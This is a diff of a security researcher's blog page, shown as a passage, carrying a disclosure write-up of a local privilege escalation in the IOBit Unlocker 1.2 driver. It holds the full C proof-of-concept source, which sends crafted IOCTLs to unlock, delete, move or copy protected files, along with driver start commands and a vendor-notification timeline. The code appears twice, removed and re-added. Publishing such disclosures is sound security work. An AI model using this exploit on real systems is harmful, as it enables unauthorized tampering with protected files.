-</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">while</span> (<span style="color:#c0f">fgetc</span>(stdin) <span style="color:#555">!=</span> <span style="color:#c30">&#39;\n&#39;</span>) <span style="color:#09f;font-style:italic">// Read until a newline is found
-</span></span></span><span style="display:flex;"><span>					;
-</span></span><span style="display:flex;"><span>				<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Invalid input</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">continue</span>;
-</span></span><span style="display:flex;"><span>			}
-</span></span><span style="display:flex;"><span>			
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> (option <span style="color:#555">&gt;</span> <span style="color:#f60">0</span> <span style="color:#555">&amp;&amp;</span> option <span style="color:#555">&lt;</span> <span style="color:#f60">7</span>)
-</span></span><span style="display:flex;"><span>			{
-</span></span><span style="display:flex;"><span>				valid <span style="color:#555">=</span> <span style="color:#366">true</span>;
-</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">while</span> (<span style="color:#c0f">fgetc</span>(stdin) <span style="color:#555">!=</span> <span style="color:#c30">&#39;\n&#39;</span>) <span style="color:#09f;font-style:italic">// Read until a newline is found, if we don&#39;t do this it will mess up code later
-</span></span></span><span style="display:flex;"><span>					;
-</span></span><span style="display:flex;"><span>			}
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">else</span>
-</span></span><span style="display:flex;"><span>			{
-</span></span><span style="display:flex;"><span>				<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Invalid number, enter something between 1 and 6</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>			}
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		DWORD dwIoctl_info <span style="color:#555">=</span> <span style="color:#f60">0x222128</span>;
-</span></span><span style="display:flex;"><span>		DWORD dwIoctl_action <span style="color:#555">=</span> <span style="color:#f60">0x222124</span>;
-</span></span><span style="display:flex;"><span>		DWORD dwBytesOut <span style="color:#555">=</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">switch</span> (option)
-</span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">1</span><span style="color:#555">:</span>
-</span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_info, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">wprintf</span>(<span style="color:#c30">L</span><span style="color:#c30">&#34;[i] File info: %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, (<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)output_buffer);
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">2</span><span style="color:#555">:</span>
-</span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x424</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">3</span><span style="color:#555">:</span>
-</span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x420</span>] <span style="color:#555">=</span> <span style="color:#f60">0x1</span>;
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x424</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">4</span><span style="color:#555">:</span> <span style="color:#09f;font-style:italic">//this is not working id the user doesn&#39;t have rights to access the file
-</span></span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x420</span>] <span style="color:#555">=</span> <span style="color:#f60">0x2</span>;
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x424</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] Enter new filename:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ReadStringFromSTDIN</span>((<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)((SIZE_T)input_buffer <span style="color:#555">+</span> <span style="color:#f60">0x210</span>));
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">5</span><span style="color:#555">:</span>
-</span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x420</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x424</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] Enter new path (move operation):</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ReadStringFromSTDIN</span>((<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)((SIZE_T)input_buffer <span style="color:#555">+</span> <span style="color:#f60">0x210</span>));
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">6</span><span style="color:#555">:</span>
-</span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x420</span>] <span style="color:#555">=</span> <span style="color:#f60">0x4</span>;
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x424</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] Enter new path (copy operation):</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ReadStringFromSTDIN</span>((<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)((SIZE_T)input_buffer <span style="color:#555">+</span> <span style="color:#f60">0x210</span>));
-</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">default</span><span style="color:#555">:</span>
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Couldn&#39;t open the driver</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#c0f">ExitProcess</span>(<span style="color:#555">-</span><span style="color:#f60">1</span>);
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#c0f">CloseHandle</span>(hDriver);
-</span></span><span style="display:flex;"><span>	<span style="color:#c0f">ExitProcess</span>(<span style="color:#f60">0</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Testing:</p>
+<pre><code class=language-c>// UnlockExploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+BOOL FileExists(LPCWSTR szPath)
+{
+    DWORD dwAttrib = GetFileAttributesW(szPath);
+    printf("[i] File exists status: 0x%08x\n", dwAttrib);
+    return (dwAttrib != INVALID_FILE_ATTRIBUTES);
+}
+
+void ReadStringFromSTDIN(wchar_t * buffer)
+{
+    printf("&gt; ");
+    fgetws((wchar_t*)buffer, 0x200, stdin);
+    memset((LPVOID)((SIZE_T)buffer + (lstrlenW((LPCWSTR)buffer) * sizeof(WCHAR) - sizeof(WCHAR))), 0x00, sizeof(WCHAR)); //remove end of line character
+}
+
+int main(int argc, char* argv[]) {
+    printf("[i] IOBit Unlocker Privilege Escalation PoC\n");
+
+    //open the driver
+    HANDLE hDriver = CreateFileW(L"\\\\.\\IOBitUnlockerDevice", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDriver != INVALID_HANDLE_VALUE)
+    {
+        printf("[+] opened handle to the driver\n");
+
+        DWORD input_buffer_size = 0x1000;
+        DWORD output_buffer_size = 0x1000;
+        //allocate input buffer
+        LPVOID input_buffer = VirtualAlloc(NULL, (SIZE_T)input_buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        if (input_buffer == NULL)
+        {
+            printf("[-] Unable to allocate memory for input buffer\n");
+            ExitProcess(-1);
+        }
+        printf("[+] Allocated input memory buffer at: 0x%Ix\n", (UINT64)input_buffer);
+
+        //allocate output buffer
+        LPVOID output_buffer = VirtualAlloc(NULL, (SIZE_T)output_buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        if (output_buffer == NULL)
+        {
+            printf("[-] Unable to allocate memory for output buffer\n");
+            ExitProcess(-1);
+        }
+        printf("[+] Allocated output buffer memory at: 0x%Ix\n", (UINT64)output_buffer);
+
+        // Clear memory area
+        memset(input_buffer, 0x00, input_buffer_size); 
+        memset(output_buffer, 0x00, output_buffer_size);
+
+        printf("[i] Enter full path for the file to unlock. Eg: C:\\Windows\\System32\\cmd.exe\n");
+        ReadStringFromSTDIN((wchar_t*)input_buffer);
+        wprintf(L"Fileto be checked: %s\n", (wchar_t *)input_buffer);
+
+        if (!FileExists((LPCWSTR)input_buffer)) {
+            printf("[-] This file doesn't exists\n");
+            ExitProcess(-1);
+        }
+        //print options
+        printf("[+] File found!\n");
+        printf("[i] Choose an option:\n");
+        printf("1 - INFO\n");
+        printf("2 - Unlock\n");
+        printf("3 - Unlock &amp; Delete\n");
+        printf("4 - Unlock &amp; Rename\n");
+        printf("5 - Unlock &amp; Move\n");
+        printf("6 - Unlock &amp; Copy\n");
+        
+        boolean valid = false;
+        int option = 0;
+        while (!valid)
+        {
+            printf("&gt; ");
+            int result = scanf_s("%d", &amp;option);
+            if (result == EOF) {
+                printf("[-] Invalid input\n");
+                continue;
+            }
+            if (result == 0) {
+                while (fgetc(stdin) != '\n') // Read until a newline is found
+                    ;
+                printf("[-] Invalid input\n");
+                continue;
+            }
+            
+            if (option &gt; 0 &amp;&amp; option &lt; 7)
+            {
+                valid = true;
+                while (fgetc(stdin) != '\n') // Read until a newline is found, if we don't do this it will mess up code later
+                    ;
+            }
+            else
+            {
+                printf("[-] Invalid number, enter something between 1 and 6\n");
+            }
+        }
+
+        DWORD dwIoctl_info = 0x222128;
+        DWORD dwIoctl_action = 0x222124;
+        DWORD dwBytesOut = 0;
+        switch (option)
+        {
+        case 1:
+        {
+            DeviceIoControl(hDriver, dwIoctl_info, input_buffer, input_buffer_size, output_buffer, output_buffer_size, &amp;dwBytesOut, NULL);
+            wprintf(L"[i] File info: %s\n", (wchar_t*)output_buffer);
+            break;
+        }
+        case 2:
+        {
+            ((byte*)input_buffer)[0x424] = 0x3;
+            DeviceIoControl(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, &amp;dwBytesOut, NULL);
+            break;
+        }
+        case 3:
+        {
+            ((byte*)input_buffer)[0x420] = 0x1;
+            ((byte*)input_buffer)[0x424] = 0x3;
+            DeviceIoControl(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, &amp;dwBytesOut, NULL);
+            break;
+        }
+        case 4: //this is not working id the user doesn't have rights to access the file
+        {
+            ((byte*)input_buffer)[0x420] = 0x2;
+            ((byte*)input_buffer)[0x424] = 0x3;
+            printf("[i] Enter new filename:\n");
+            ReadStringFromSTDIN((wchar_t*)((SIZE_T)input_buffer + 0x210));
+            DeviceIoControl(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, &amp;dwBytesOut, NULL);
+            break;
+        }
+        case 5:
+        {
+            ((byte*)input_buffer)[0x420] = 0x3;
+            ((byte*)input_buffer)[0x424] = 0x3;
+            printf("[i] Enter new path (move operation):\n");
+            ReadStringFromSTDIN((wchar_t*)((SIZE_T)input_buffer + 0x210));
+            DeviceIoControl(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, &amp;dwBytesOut, NULL);
+            break;
+        }
+        case 6:
+        {
+            ((byte*)input_buffer)[0x420] = 0x4;
+            ((byte*)input_buffer)[0x424] = 0x3;
+            printf("[i] Enter new path (copy operation):\n");
+            ReadStringFromSTDIN((wchar_t*)((SIZE_T)input_buffer + 0x210));
+            DeviceIoControl(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, &amp;dwBytesOut, NULL);
+            break;
+        }
+        default:
+            break;
+        }
+    }
+    else {
+        printf("[-] Couldn't open the driver\n");
+        ExitProcess(-1);
+    }
+    CloseHandle(hDriver);
+    ExitProcess(0);
+}</code></pre>
+<p>Testing:</p>
 <p>The driver is normally started only if we start the main application, and once we exit it will be terminated and disabled. If we want to start it manually for the testing, we need to start it by our own:</p>
-<pre tabindex="0"><code>sc config iobitunlocker start= demand
-sc start iobitunlocker
-</code></pre><p>POC code available at:
-<a href="https://github.com/theevilbit/exploits/tree/master/IOBit%20Unlocker%201.2%20LPE/UnlockExploit"  class="external-link" target="_blank" rel="noopener">IOBit Unlocker POC</a></p>
+<pre><code>sc config iobitunlocker start= demand
+sc start iobitunlocker</code></pre>
+<p>POC code available at:
+<a href="https://github.com/theevilbit/exploits/tree/master/IOBit%20Unlocker%201.2%20LPE/UnlockExploit" rel="noopener">IOBit Unlocker POC</a></p>
 <p>Contact / vendor notification:</p>
-<ol>
-<li>2019.07.25. - Initial contact through webform - never got response</li>
-<li>2019.07.29. - Contact CERT - CERT never got response from vendor</li>
-<li>2019.08.20. - Try to contact vendor via Twitter - never got response</li>
-<li>2019.08.20. - Contact MITRE for CVE assignment (no response)</li>
-<li>2019.09.03. - Last trial through web form (sent in full report), no response</li>
-<li>2019.10.12. - Public disclosure</li>
-</ol>
-
-      </div>
-
-
-      <footer>
-        
-
-
-        
-        
-        
-        
-        
-        
-        
-      </footer>
-    </article>
-
-    
-  </section>
-
-    </div>
-
-    <footer class="footer">
-  <section class="container">
-    ©
-    
-      2019 -
-    
-    2026
-     Csaba Fitzl 
-    ·
-    
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
-    
-  </section>
-</footer>
-
-  </main>
-
-  
-
-  
-  
-  <script src="https://theevilbit.github.io/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
+<ol><li>2019.07.25. - Initial contact through webform - never got response</li><li>2019.07.29. - Contact CERT - CERT never got response from vendor</li><li>2019.08.20. - Try to contact vendor via Twitter - never got response</li><li>2019.08.20. - Contact MITRE for CVE assignment (no response)</li><li>2019.09.03. - Last trial through web form (sent in full report), no response</li><li>2019.10.12. - Public disclosure</li></ol></div>
+<nav class="pn"><a class="prev" href="/posts/few_click_rce_via_github_desktop_macos_client_with_gatekeeper_bypass_and_custom_url_handlers/"><span>← previous</span>NOCVE - Few click RCE via GitHub Desktop macOS client with Gatekeeper bypass and custom URL handlers</a><a class="next" href="/posts/gatekeeper_bypass_or_not_bypass/"><span>next →</span>GateKeeper - Bypass or not bypass?</a></nav></article></main>
+  <footer class="foot">
+    <span>© 2026 Csaba Fitzl</span>
+    <span class="social"><a href="https://github.com/theevilbit/" rel="me noopener">GitHub</a><a href="https://x.com/theevilbit" rel="me noopener">X</a><a href="/index.xml" rel="me noopener">RSS</a></span>
+  </footer>
+</div>
+<script>
+document.getElementById("theme").addEventListener("click", function () {
+  var t = document.documentElement.dataset.theme === "light" ? "dark" : "light";
+  document.documentElement.dataset.theme = t;
+  try { localStorage.setItem("tb.theme", t); } catch (e) {}
+});
+</script>
 </body>
 </html>
